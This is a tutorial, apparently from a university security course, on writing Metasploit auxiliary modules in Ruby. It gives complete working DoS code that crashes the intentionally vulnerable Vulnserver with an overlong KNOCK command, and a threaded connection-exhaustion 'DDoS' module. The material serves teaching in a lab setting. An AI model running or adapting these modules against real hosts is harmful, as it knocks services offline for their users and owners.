# Making DoS and DDoS Metasploit modules 
This is a walkthrough that can be used to describe the process of making a general Metasploit Module. However the main focus of this is making a DoS and DDoS Metasploit module for Vulnserver a vulnerable chat server. 
## Table of Contents 
* [Introduction](#introduction)
* [Writing Modules](#writing-modules)
    * [Different types of Modules](#different-types-of-modules)
    * [Start of a Module](#start-of-a-module)
    * [Ranking](#ranking)
    * [Mixins](#mixins)
    * [Initialize](#initialize)
    * [Super(update_info)](#superupdate_info)
    * [Datastore](#datastore)
    * [register_options](#register_options)
    * [deregister_options](#deregister_options)
    * [Creating new Datastore objects](#creating-new-datastore-objects)
    * [Accessing Datastore Objects](#accessing-datastore-objects)
* [Design Choices](#design-choices)
    * [DoS](#dos)
    * [DDoS](#ddos)
* [Writing the run function of the Auxiliary Module](#writing-the-run-function-of-the-auxiliary-module)
    * [Msf::Auxillary](#msfauxillary)
    * [DoS Module](#dos-module)
    * [DDoS Module](#ddos-module)
* [Final Code](#final-code)
    * [DoS Code](#dos-code)
    * [DDoS Code](#ddos-code)
* [References](#references)



## Introduction 
<a href="https://docs.rapid7.com/metasploit/modules#:~:text=A%20module%20is%20a%20piece%20of%20software%20that%20the%20Metasploit%20Framework%20uses%20to%20perform%20a%20task%2C%20such%20as%20exploiting%20or%20scanning%20a%20target">Metasploit modules</a> are pieces of software written in Ruby that the Metasploit Framework uses to preform a specific task or function. You do not need to be entirely familiar with the Ruby programming language to make a working module as Ruby is similar to other programming languages such as Python so you can often guess what a Ruby program does.

The first thing that you should know is what the different kinds of modules are, as each one gives different sets of functionality. What type of module you inherit from also gives us an idea of what module should be used for.


## Writing Modules

### Different types of Modules 
There are many <a href="https://docs.rapid7.com/metasploit/msf-overview/#:~:text=executes%20a%20sequence%20of%20commands%20to%20target%20a%20specific%20vulnerability%20found%20in%20a%20system%20or%20application.%20An%20exploit%20module%20takes%20advantage%20of%20a%20vulnerability%20to%20provide%20access%20to%20the%20target%20system">different types of modules</a>. They and their characteristics are listed below. The two main modules we are concerned with are the Auxiliary and Exploit modules. This is because in our case we want to make both a DoS/DDoS and Exploit module for the vchat server. 
* In the cases of <a href="https://github.com/xinwenfu/Malware-Analysis/tree/main/MetasploitNewModule">our Exploit module</a> we are going to want to include a payload to gain further access to the system so that it should be an Msf::Exploit class of module. 
* Then in the case of our DOS/DDoS module we would want it to be a Msf:Auxillary class of module as no payload is going to be used or needed. This is the focus of this post.

1. Exploit Modules
   * They Executes a sequence of commands to target a specific vulnerability found in a system or application
   * They take advantage of a vulnerability to provide access to the target system
   * Examples include buffer overflows, code injections and web application exploits
2. Auxiliary Modules
   * They do not execute a payload
   * They can be used to perform arbitrary actions that may not be directly related to gaining access to a system
   * Examples include scanners, fuzzers, and denial of service attacks
3. Post-Exploitation Modules
   * They enable you to gather more information or to gain further access to an exploited target system
   * Examples include hash dumps and application and service enumerators
4. Payload Modules
   * They can be shell code that runs after an exploit successfully compromises a system
   * They enable you to define how you want to connect to the shell and what you want to do to the target system after you take control of it
   * A payload can open a Meterpreter or command shell
     * This command shell is an advanced payload that allows you to write DLL files to dynamically create new features as you need them.
5. NOP-generator Module
   * A NOP generator produces a series of random bytes that you can use to bypass standard IDS and IPS NOP sled signatures. Use NOP generators to pad buffers

### Start of a Module

The first part of a metasploit module is the definition of the new module itself. If you are familiar with object oriented languages like Java or C++ then you are likely familiar with inheritance. Our new module will inherit descriptors, functions and Datastore objects. 

```ruby
class MetasploitModule < Msf::Exploit
    ...
    ...
```

Above we are defining a new MetasploitModule which inherits from the **Msf::Exploit** base class. If you would like to see more information on the base class you can access it [here](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit). In place of "Msf::Exploit" you can have any of **Msf::Auxillary**, **Msf::Post**, **Msf::Nop**, and **Msf::Payload** instead.

### New Class Definition

Above we have defined a new class, but we must define components of the class, and functions that will be part of the new module in order to make it useful. If you looked at the reference page for **Msf::Exploit** linked earlier you may have noticed there are many characteristics of a module that we can define. But we will be focusing on the few necessary ones to describe the module and make it work.

#### Ranking
The first thing that we include in the new class is a <a href="https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html">threat ranking</a>, there are several different rankings defined and they tell us **how severe and reliable the exploit is**.

There are many different rankings that you can chose from, and they are listed below from lowest to highest.
* **ManualRanking** \- Exploit is unstable or difficult to exploit and is basically a DoS. It has a success rate of 15% or lower. This rating may be used when a module has no use unless it is specifically configured by the user.
* **LowRanking** \- Exploit is nearly impossible to exploit on common platforms with under a 50% success rate.
* **AverageRanking** \- Exploit is generally unreliable or difficult to exploit but it has a success rate of 50% or more for common platforms. 
* **NormalRanking** \- Exploit is otherwise reliable but it depends on a specific version that is not the "common case" for a type of software. It cannot or does not reliably autodetect the target.
* **GoodRanking** \- Exploit has a default target and does not autodetect the target. It works on the "common case" of a type of software, such as Windows 7/10/11, and Windows server 2012/2016..
* **GreatRanking** \- This has a default target and will either autodetect the appropriate target or use an application-specific return address after a version check.
* **ExcellentRanking** \- This exploit will never crash the service.
[*refrence for above points*](https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html)


For simplicity we select the NormalRanking for the Metasploit modules exploiting the vchat server. These exploits will work with proper configuraitons of the Windows machine the vchat server is running on.

This will result in the following module
```ruby
class MetasploitModule < Msf::Auxillary
  Rank = NormalRanking	# Potential impact to the target
  ...
```
#### Mixins
[Mixins](https://ruby-doc.com/docs/ProgrammingRuby/html/tut_modules.html) are an important concept in Ruby and the Metasploit Framework. Mixins are modules that are included inside of class. They expand the functionality of the class with that of the specified module. The main thing we are concerned with in the Metasploit framework are the **Datastore** objects and the functions that a Mixins provide.

When creating the DoS, and Exploit modules both will use the **Msf::Exploit::Remote::Tcp** Mixin. If the module is a DoS or DDoS module it will also include the **Msf::Auxillary::Dos** module. 

The [**Msf::Exploit::Remote::Tcp**](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit/Remote/Tcp) Mixin will provide us with necessary TCP/IP functions to interact with  remote servers, and the **Datastore** objects necessary to control those functions. 
* Note that it is possible to implement this using standard Ruby TCP/IP libraries and functions.

The [**Msf::Auxillary::Dos**](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Auxiliary/Dos) provides DoS functionalities to the module, along with identifying the Auxiliary module as a DoS module.

Once we include mixins we will have the following module:
```ruby
class MetasploitModule < Msf::Auxillary
  Rank = NormalRanking	            # Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# In DoS and Exploit modules
  include Msf::Auxiliary::Dos       # Only in DoS and DDoS modules
```
#### Initialize
This is where the majority of the Module is defined, of course this excludes the functions use to run the exploits. This is the constructor and it will set the default values of the new Metasploit module.

You may notice this contains a **super** statement, that is a ruby function that will call the specified parent class's function of that name. 

It should before filling out the **super** function call look like the following:
```ruby 
class MetasploitModule < Msf::Auxillary
  Rank = NormalRanking	            # Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# In DoS and Exploit modules
  include Msf::Auxiliary::Dos       # Only in DoS and DDoS modules
  def initialize(info = {})	      # i.e. constructor, setting the initial values
    super(...)
...
```

#### Super(update_info(...))
You may have noticed that in the above **initialize** we did not appear to do anything at all. This is because at least in our case all of the *magic* happens in the **super(update_info(info, ...))** function call.

This function is where we set the **attributes** of the module and those attributes are defined [here](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit#:~:text=Instance%20Attribute%20Summary) and at other parent class references. We will be using only those necessary for our new Metasploit module to work and to describe the module to the users. 

In all three modules we will be using the **'Name'**, **'Description'**, **'Author'**, **'License'**, **'References'**,  **'Privileged'**, and **'DisclosureDate'** atributes. 

In the case of our Exploit module we additionally use **'Payload'**, **'Platform'**, **'Targets'**, **'DefaultOptions'**, and **'DefaultTarget'** see [this](https://github.com/xinwenfu/Malware-Analysis/tree/main/MetasploitNewModule#create-a-custom-module) for a complete view of this module.

* **'Name'** \- This is the name of the the Exploit.
* **'Description'** \- This explains what the exploit is, what it does to the target computer, and anything else that a user would need to know about the exploit.
* **'Author'** \- This is a list of the Authors of the Module/Exploit
* **'License'** \- This is the license the exploit can be distributed under ***Check***
* **'References'** \- This is a list of additional information about the attack, what was used in it creation and even proofs of concept attacks.
* **'Privileged'** \- This is whether the module grants or requires high privileges [ref](https://docs.metasploit.com/api/Msf/Module/Privileged.html).
* **'DisclosureDate'** \- This is when the exploit was disclosed.
* **'Payload'** \- This defines charicteristics about the encoded payload that will be generated and sent by the **Msf::Exploit** module. There are atriubutes that are defined in that that you will see below
    * **'Space'** \- This defines how much space the encoded payload can take up. ***Reword***
    * **'BadChars'** \- This defines characters to avoid when creating the encoded payload.
* **'Platform'** \- This defines what platforms are supported by this module.
* **'Targets'** \- This defines a list of targets and their attributes that may be used by the module. 
* **'DefaultTarget'** \- This defines the element of the **'Targets'** list to use by default 
* **'DefaultOptions'** \- This defines the defualt settings of options in the Module.

There are many other attributes that can be used. If you want to see an alternative walkthrough of this you can reference [this](https://www.offensive-security.com/metasploit-unleashed/creating-auxiliary-module/)


What we get from filling out that information in the **super(update_info(info, ...)** is the following.

In the case of the DoS and DDoS modules
```ruby
class MetasploitModule < Msf::Auxiliary	
  Rank = NormalRanking	

  include Msf::Exploit::Remote::Tcp	      # This would not be in the DDoS module
  include Msf::Auxiliary::Dos

  def initialize(info = {})	
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command', 
      'Description'    => %q{
         Vulnserver is intentionally written vulnerable. This expoits uses a simple buffer overflow.
      },
      'Author'         => [ 'fxw', 'GenCyber-UML-2022'], 
      'License'        => MSF_LICENSE,
      'References'     =>	
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Mar. 30, 2022'))	
...
```

In the case of the Exploit module from [this](https://github.com/xinwenfu/Malware-Analysis/tree/main/MetasploitNewModule#create-a-custom-module:~:text=to%20write%20modules.-,%23%23,-%23%20The%20%23%20symbol%20starts):
```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking	

  include Msf::Exploit::Remote::Tcp	

  def initialize(info = {})	
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command',	
      'Description'    => %q{	
         Vulnserver is intentionally written vulnerable.
      },
      'Author'         => [ 'fxw' ],	
      'License'        => MSF_LICENSE,
      'References'     =>	
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },      
      'Payload'        =>
        {
 #         'Space'    => 5000,	
          'BadChars' => "\x00\x0a"	
        },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>	
        [
          [ 'vulnserver-KNOCK',
            {
              'jmpesp' => 0x6250151C # This will be available in [target['jmpesp']]
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))
```
*Notice that each attribute and sub attribute element is separated by a comma. **remember** these are arguments to a function or members of a list!* 

#### Datastore
<a href="https://docs.metasploit.com/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html">Datastore</a> is a structure used by the Metasploit framework to configure options in the Metasploit modules. As previously mentioned, some of these Datastore objects are from Mixins but we can also defined new ones to be part of the new Metasploit module. 

A Datastore object can have the following types. *This is an abridged description, see [this](https://docs.metasploit.com/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html) for more details.
* **OptAddress** \- IPv4 address.
* **OptAddressRange** \- Range of IPv4 Addresses (ex. 10.0.3.1/24)
* **OptBool** \- Stores a boolean options, True or False.
* **OptEnum** \- This stores a value from a predefined list of accepted values.
* **OptInt** \- Stores a integer value, this can either be a hex or decimal value.
* **OptPath** \- Stores a local file path
* **OptPort** \- Stores a port (socket) number, this is between 0 and 65535
* **OptRaw** \- Function is the same as OptString
* **OptRegexp** \- Stores a regular expression
* **OptString** \- Stores a string, if it begins with "**file://**" it will read from the beginning of that file to get a string.

Now that we know the available types od Datastore objects we can create, store or update in our module we can start defining them.

#### register_options([...])
Creating new Datastore objects or setting the values of predefined objects is primarily done in the *register_options* function. We do not use, or discuss the [*register_advanced_options*](https://docs.metasploit.com/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#the-register_advanced_options-method) method.

The register_options when it is empty will look like the following below. Notice that the argument will be an array, which will be a comma separated list of Datastore objects to set or create.
```ruby
register_options(
  [
   ...,
   ...,
   ...
  ])
```
Setting a new default value of an already existing Datastore object, that comes from a Mixin is relatively simple. All you have to do is add "**Opt::\<NAME\>(NewValue)**"  to the above array where \<Name\> is the Datastore Object you want to set the value of. 

Example:
```ruby
register_options(
  [
   Opt::RPORT(9999),
   Opt::LPORT(1025),
   ...
  ])
```
You can also use the *DefaultOptions* atribute to set the defualt value of the Datastore object in the following way. This would be located in the *super(update_info(info, ...)* function discussed earlier. Below is an example:
```ruby
'DefaultOptions' =>
{
   'RPORT' => 9999
   'LPORT' => 1025
}
```

If you want to create new Datastore objects the process is a bit more complected as you need to use a *constructor* of the Datastore type.

#### Creating new Datastore Objects
When <a href="https://docs.metasploit.com/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#core-option-types">creating new datastore objects</a> you will have something like **Opt\<Type\>.new(...)** in the *register_options* function.

The constructor will have the following structure and arguments.
```ruby
Opt\<Type\>.new(option_name, [boolean, description, value, *enums*], aliases: *aliases*, conditions: *conditions*)
```
* **option_name** \- This is the name of the Datastore option, you will use it to access the value it stores
* **boolean** \- This defines whether this is a required (True) or optional (false) option
* **description** \- This is a short description of this option, often describing what it influences or does.
* **value** \- This is the default value, if the **boolean** is set to false this does not need to be set as it will automatically be *nil*. 
* **enum** \- This is a *optional* list of accepted values. Ex ["LEFT", "RIGHT", "CENTER", ...]
* **aliases** \- This is an optional array of keywords that can alternatively be used to refer to this datastore object. This is often used when renaming datastore objects to retain backwards compatibility. 
* **conditions** \- This is an array of conditions which when met will lead to the option being displayed. This is optional and is used to hid options that are irrelevant based on other configurations.
*The information above is taken and slightly rephrased from* [*ref*](https://docs.metasploit.com/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#core-option-types)


So if we want to create a Datastore object called *ThreadNum* for the DDoS module, and define the *RHOST* and *RPORT* objects as we are not using the **Msf::Exploit::Remote:Tcp** mixin. We would have the following in the *register_options* function:
```ruby
register_options(
[
        OptInt.new('ThreadNum', [ true, 'A hex or decimal', 10]) # Sets the number of threads to use
        OptAddress.new('RHOST', [ true, 'Set IP of Reciving Host', '127.0.0.1' ]),
        OptPort.new('RPORT', [true, 'Set Port of Reciving Host', 9999])
])
```

#### deregister_options(...)

This is a simple way of <a href="https://docs.metasploit.com/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#the-deregister_options-method">removing unused datastore options</a> that are provided by mixin modules. It is as simple as doing the following:
```ruby
deregister_options('OPT1', 'OPT2', ...)
```
This would likely be located below the *register_options* function.

#### Accessing Datastore Objects

This will become important a little later, but the way you <a href="https://docs.metasploit.com/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#how-metasploit-developers-look-at-datastore-options">access the datastore object</a> is quite simple. All you have to do is **datastore['\<NameOfObject\>']** where you replace **\<NameOfObject\>** with the name of the datastore object you would like to access. 

The following is an example:
```ruby 
print datastore['RPORT'] 
print datastore['MyCustomObject']
tagetIP = datastore['RPORT'] 
...  
```

It is not recommended that you directly change the values of datastore objects at runtime. That is, you should not do the following: 
```ruby
datastore['RHOST'] = 127.0.0.1 
```
Instead you should override a method. The example they give is that mixins often retrieve datastore objects in the following way:
```ruby 
def rport
  datastore['RPORT']
end
```

In this case you can override the function in the following way to change the value at runtime:
```ruby
def rport
  80
end
```
## Design Choices  
This section will contain a bit of information on the definition of the new Metasploit modules and why some of the things were done the way they were. This will also have the **FULL** class definition of the DoS and DDoS modules as code blocks excluding the functions the modules will use.

### DoS
The DoS module definition is almost the same as the **Msf::Exploit** Knock module's. This is because it makes one connection with the functions provided by the **Msf::Exploit::Remote::Tcp** Mixin. It uses this connection to send the malicious message, and the Mixin provides a few datastore objects to control those functions we use to make the connection. Since we are only sending a message, and are not expecting a response as it hopefully crashes the server the only datastore objects we need are *RHOST*  which is configured by the user and *RPORT*.  We assume the server is running on a known default port of 9999 so we will set the default value of *RPORT* to 9999. We also do not need any target or platform information as we are simply using a buffer overflow to crash the server rather than execute arbitrary code.

This results in the following module:
```ruby
# DoS
class MetasploitModule < Msf::Auxiliary	
  Rank = NormalRanking	

  include Msf::Exploit::Remote::Tcp	
  include Msf::Auxiliary::Dos

  def initialize(info = {})	
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command', 
      'Description'    => %q{
         Vulnserver is intentionally written vulnerable. This exploits uses a simple buffer overflow.
      },
      'Author'         => [ 'fxw', 'GenCyber-UML-2022'], 
      'License'        => MSF_LICENSE,
      'References'     =>	
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Mar. 30, 2022'))	
      register_options([
      	Opt::RPORT(9999)
      ])
  end
```
### DDoS

This module is meant to create a number of connections to the vulnserver and which is defined by the user. This is done to clog the vchat server and prevent other *normal* users from connecting. We do not use the **Msf::Exploit::Remote::Tcp** mixin because the **connect** function it provides will timeout the connection after a period of time. We use Ruby's *socket* library to get the same functionality while also defining a *RPORT* and *RHOST* datastore option to use the same conventions as modules that use the **Msf::Exploit::Remote::Tcp** mixin.   

This results in the following Module:
```ruby
# DDoS
require 'socket'

class MetasploitModule < Msf::Auxiliary
    include Msf::Auxiliary::Dos 
    Rank = NormalRanking

    def initialize(info = {})
        super(update_info(info, 
            'Name'           => 'Vulnserver DDoS', 
            'Description'    => %q{
                Vulnserver is intentionally written vulnerable. This exploits uses a simple buffer overflow.
            },
            'Author'         => [ 'fxw', 'GenCyber-UML-2022'], 
            'License'        => MSF_LICENSE,
            'References'     =>	
            [
                [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
            ],
            'Privileged'     => false,
            'DisclosureDate' => 'Mar. 30, 2022'))	
            register_options(
            [
                OptInt.new('ThreadNum', [ true, 'A hex or decimal', 10]), 
                OptAddress.new('RHOST', [ true, 'Set IP of Reciving Host', '127.0.0.1' ]),
                OptPort.new('RPORT', [true, 'Set Port of Reciving Host', 9999])
            ])
        end
```
## Writing the run function of the Auxiliary Module
This section will be on defining the functions that run the **Msf::Auxillary** modules in the Metasploit Framework's console or Arimitage application. This will be in general what the function definition looks like, and the specific cases for both the DoS and DDoS modules.

### Msf::Auxillary
The **Msf::Auxillary** modules defines a function *run*, this is where the code to start execution is generally placed, and is the equivalent of a *main* function in C, C++ or Java to the new Metasploit module. The body of the *run* function will contain normal Ruby code.

You can define additional function that the *run* function calls and interacts with, but we use the *run* function as the entrypoint of the program when executing the Metasploit module.

The *run* function will look something like the following:
```ruby
def run
    ...
    ...
    # Normal Ruby code
    ...
    ...
end
```
### DoS Module
The DoS module that is contained in this repository contains additional code and comments to describe and show what is happening. The following will show a minimal definition of the *run* function for the DoS module. 

The purpose of the DoS module is to send a specially crafted message which will exploit a buffer overflow to crash the chat server. We will need to do the following:
1. Connect to the server.
1. Generate the malicious message.
1. Send the malicious message to the server.
*we can optionally disconnect from the server, this would only have effect if the server does not crash*

With those requirements in mind we will create the following *run* function.

```ruby 
def run
    connect            # This is a function from the Msf::Exploit::Remote:Tcp Mixin that connect to the RHOST, on RPORT
    outbound = "KNOCK /.:/" + "A"*10000 # Create outbound message
    sock.put(outbound) # sends message to target

    ensure             # Ensures the exploit disconnects from the server
        disconnect
    end
end
```

### DDoS Module
The DDoS module that is contained in this repository will have slightly different code from what is in the codeblock below. They will have the same functionality but print statements will be removed and comments may be different.

The purpose of the DDoS module is to create a certian number of connections to the specified server. The number of connections is specified by the user in the *ThreadNum* datastore object. In order to do this we will need to use multiple threads so that we can create and hold multiple connections at the same time. Earlier we also mentioned we will not be using the **Msf::Exploit::Remote::Tcp** Mixin. Again this is because the **connect** function that it provides will time out the connection after a certain amount of time. We want to hold the connection indefinitely, so we use Ruby's *socket* library. We will want to do the following:
1. Create a number of threads specified by the ThreadNum datastore object
1. The threads will create a socket object 
    * The threads will connect to the server using the information provided by the Datastore object *RHOST* and *RPORT*
    * The threads will hold the connection indefinitely 
1. The program will not close the threads.


With those requirements in mind we will create the following *run* function. We will also create a helper function, and this will be the function the individual threads will run.
```ruby
def threadExploit
    threadSocket = TCPSocket.new datastore['RHOST'], datastore['RPORT']
    while(1)
        threadSocket.gets
    end
end

def run
    for x in 1..datastore['ThreadNum'] do
        Thread.new(threadExploit())
    end
end
```
## Final Code
These are the end results of making the Metasploit module's body and functions for both the DoS and DDoS modules. They will be slightly different from the code in the repository as they will have the slightly simplified run and helper function.


### DoS Code
```ruby
# DoS
class MetasploitModule < Msf::Auxiliary	
  Rank = NormalRanking	

  include Msf::Exploit::Remote::Tcp	
  include Msf::Auxiliary::Dos

  def initialize(info = {})	
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command', 
      'Description'    => %q{
         Vulnserver is intentionally written vulnerable. This exploits uses a simple buffer overflow.
      },
      'Author'         => [ 'fxw', 'GenCyber-UML-2022'], 
      'License'        => MSF_LICENSE,
      'References'     =>	
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Mar. 30, 2022'))	
      register_options([
      	Opt::RPORT(9999)
      ])
  end

  def run
    connect # This is a function from the Msf::Exploit::Remote:Tcp Mixin that connect to the RHOST, on RPORT
    outbound = "KNOCK /.:/" + "A"*10000 # Create outbound message
    sock.put(outbound) # sends message to target

    ensure # Ensures the exploit disconnects from the server
        disconnect
    end
  end
end
```
### DDoS Code
```ruby
# DDoS
require 'socket'

class MetasploitModule < Msf::Auxiliary
    include Msf::Auxiliary::Dos 
    Rank = NormalRanking

    def initialize(info = {})
        super(update_info(info, 
            'Name'           => 'Vulnserver DDoS', 
            'Description'    => %q{
                Vulnserver is intentionally written vulnerable. This exploits uses a simple buffer overflow.
            },
            'Author'         => [ 'fxw', 'GenCyber-UML-2022'], 
            'License'        => MSF_LICENSE,
            'References'     =>	
            [
                [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
            ],
            'Privileged'     => false,
            'DisclosureDate' => 'Mar. 30, 2022'))	
            register_options(
            [
                OptInt.new('ThreadNum', [ true, 'A hex or decimal', 10]), 
                OptAddress.new('RHOST', [ true, 'Set IP of Reciving Host', '127.0.0.1' ]),
                OptPort.new('RPORT', [true, 'Set Port of Reciving Host', 9999])
            ])
    end

    def threadExploit
        threadSocket = TCPSocket.new datastore['RHOST'], datastore['RPORT']
        while(1)
            threadSocket.gets
        end
    end

    def run
        for x in 1..datastore['ThreadNum'] do
            Thread.new(threadExploit())
        end
    end
end
```
## References
1. https://docs.rapid7.com/metasploit/msf-overview/ (general MSF stuff)
   * https://docs.rapid7.com/metasploit/msf-overview/#Finding-Modules
   * https://docs.rapid7.com/metasploit/modules/
1. https://docs.metasploit.com/api/Msf.html # Docs on modules (ruby)
   * https://docs.metasploit.com/api/Msf/Module/Privileged.html
1. https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf
   * https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit
   * https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit/Remote/Tcp
   * https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Auxiliary/Dos
1. https://docs.metasploit.com/
   * https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html
   * https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html
   * https://docs.metasploit.com/docs/development/developing-modules/guides/get-started-writing-an-exploit.html
   * https://docs.metasploit.com/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html
   * https://docs.metasploit.com/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html
1. https://github.com/rapid7/metasploit-framework/tree/master/modules
   * https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary
   * https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits
   * https://github.com/lattera/metasploit/blob/master/documentation/samples/modules/exploits/sample.rb
   * *refrenced various exitsing modules for structure*
1. https://www.offensive-security.com/metasploit-unleashed/exploit-development/
   * https://www.offensive-security.com/metasploit-unleashed/creating-auxiliary-module/
   * https://www.offensive-security.com/metasploit-unleashed/building-module/
   * https://www.offensive-security.com/metasploit-unleashed/exploit-mixins/
1. https://docs.rapid7.com/metasploit/msf-overview/
1. https://ruby-doc.com/docs/ProgrammingRuby/html/tut_modules.html
1. https://github.com/xinwenfu/Malware-Analysis/tree/main/MetasploitNewModule
